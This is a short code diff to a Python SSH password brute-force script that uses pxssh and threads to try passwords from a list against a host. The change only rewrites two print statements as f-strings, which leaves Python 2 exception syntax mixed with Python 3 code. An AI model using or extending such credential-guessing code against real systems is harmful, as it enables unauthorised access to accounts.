@@ -14,7 +14,7 @@ def connect(host, user, password, release):
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print('[+] Password Found: ' + password)
+        print(f'[+] Password Found: {password}')
         Found = True
     except Exception, e:
         if 'read_nonbloacking' in str(e):
@@ -52,7 +52,7 @@ def main():
 
         connection_lock.acquire()
         password = line.strip('\r').strip('\n')
-        print("[-] Testing: " + str(password))
+        print(f"[-] Testing: {password}")
         t = Thread(target=connect, args=(host, user, password, True))
         child = t.start()
 
